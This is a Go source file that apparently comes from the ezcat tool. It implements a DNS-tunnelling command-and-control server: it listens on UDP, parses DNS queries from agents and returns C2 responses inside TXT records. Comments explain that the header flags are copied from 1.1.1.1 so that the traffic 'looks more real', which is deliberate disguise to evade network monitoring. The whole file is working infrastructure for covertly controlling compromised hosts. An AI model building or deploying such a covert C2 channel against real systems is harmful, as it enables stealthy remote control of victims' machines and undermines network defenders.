package agent

import (
	"bytes"
	"encoding/binary"
	"net"

	"github.com/ngn13/ezcat/server/global"
	"github.com/ngn13/ezcat/server/log"
)

type AgentServer struct{
  Conn *net.UDPConn
}

func (s *AgentServer) Fail(client *net.UDPAddr, packet *DNS_Packet) {
  response := DNS_Packet{
    Header: DNS_Header{
      ID: packet.Header.ID,
      
      // actual header flag from 1.1.1.1, so it looks more real
      Flags: 33187, 
      // QR = R, Opcode = standart, AA = 0, TC = 0, RD = 1, RA = 1, Z = 0 
      // answer is authenticated, non-auth is unacceptable
      // reply code is 3 (Name Error - NXDOMAIN)
      
      QDCount: packet.Header.QDCount,
      ANCount: 0,
      NSCount: 0,
      ARCount: 0,
    },
  }

  response.Questions = append(response.Questions, packet.Questions...)

  buffer, err := UtilPacketToBuffer(&response)
  if err != nil {
    log.Debug("Failed to send response to %s: %s", client.String(), err.Error())
    return
  }

  _, err = s.Conn.WriteToUDP(buffer.Bytes(), client)
  if err != nil {
    log.Debug("Failed to write response to %s: %s", client.String(), err.Error())
  }
}

func (s *AgentServer) Response(client *net.UDPAddr, packet *DNS_Packet) {
  qname := packet.Questions[0].Qname
  res, err := ProtocolHandle(client, qname)

  if err != nil {
    log.Debug("Failed to handle packet: %s", err.Error())
    return
  }

  if res == "" {
    return
  }

  response := DNS_Packet{
    Header: DNS_Header{
      ID: packet.Header.ID,
      
      // again, actual header flag from 1.1.1.1, so it looks more real
      Flags: 33152, 
      // QR = R, Opcode = standart, AA = 0, TC = 0, RD = 1, RA = 1, Z = 0 
      // answer is authenticated, non-auth is unacceptable
      // reply code is 0 (No Error)
      
      QDCount: packet.Header.QDCount,
      ANCount: 0,
      NSCount: 0,
      ARCount: 0,
    },
  }

  response.Questions = append(response.Questions, packet.Questions...)

  datasz := len(res)
  data := new(bytes.Buffer)

  data.WriteByte(byte(datasz))
  data.Write([]byte(res))

  response.Answers = append(response.Answers, DNS_RR{
    Name:     response.Questions[0].Qname,
    Type:     16, // TXT record
    Class:    1,
    TTL:      300,
    RDLength: uint16(datasz+1),
    RData:    data.Bytes(),
  })
  response.Header.ANCount++

  buffer, err := UtilPacketToBuffer(&response)
  if err != nil {
    log.Debug("Failed to send response to %s: %s", client.String(), err.Error())
    return
  }

  _, err = s.Conn.WriteToUDP(buffer.Bytes(), client)
  if err != nil {
    log.Debug("Failed to write response to %s: %s", client.String(), err.Error())
  }
}

func (s *AgentServer) Handle(client *net.UDPAddr, req []byte) {
  var (
    buffer *bytes.Buffer = bytes.NewBuffer(req)
    packet DNS_Packet
    err    error
  )

  err = binary.Read(buffer, binary.BigEndian, &packet.Header)
  if err != nil {
    log.Debug("Failed to read DNS header from %s: %s", client.String(), err.Error())
    return
  }

  log.Debug("Reading %d question(s)", packet.Header.QDCount)
  packet.Questions = make([]DNS_QD, packet.Header.QDCount)

  for i := range packet.Questions {
    packet.Questions[i].Qname, err = UtilReadQname(buffer)
    if err != nil {
      log.Debug("Failed to read question QNAME from %s: %s", client.String(), err.Error())
      return
    }
   
    packet.Questions[i].Qtype  = binary.BigEndian.Uint16(buffer.Next(2))
    packet.Questions[i].Qclass = binary.BigEndian.Uint16(buffer.Next(2))

    log.Debug("Question: %s, %d, %d",
      packet.Questions[i].Qname,
      packet.Questions[i].Qtype,
      packet.Questions[i].Qclass,
    )
  }

  // packet should only have one question, or its not valid
  // for the c2 protocol
  if packet.Header.QDCount != 1 {
    s.Fail(client, &packet)
    return
  }

  s.Response(client, &packet)
}

func (s *AgentServer) Start(){
  var err error

  s.Conn, err = net.ListenUDP("udp", &net.UDPAddr{IP: net.IPv4zero, Port: global.CONFIG_AGENTPORT})
  if err != nil {
    log.Err("Failed to create the agent server")
    return
  }
  defer s.Conn.Close()

  log.Info("Agent server is running on port %d", global.CONFIG_AGENTPORT)

  for {
    req := make([]byte, UDP_LIMIT)
    reqsz, client, err := s.Conn.ReadFromUDP(req)
    if err != nil {
      log.Err("Failed to read from agent server: %s", err.Error())
      continue
    }

    log.Debug("Received %d bytes from %s", reqsz, client.String())
    go s.Handle(client, req)
  }
}
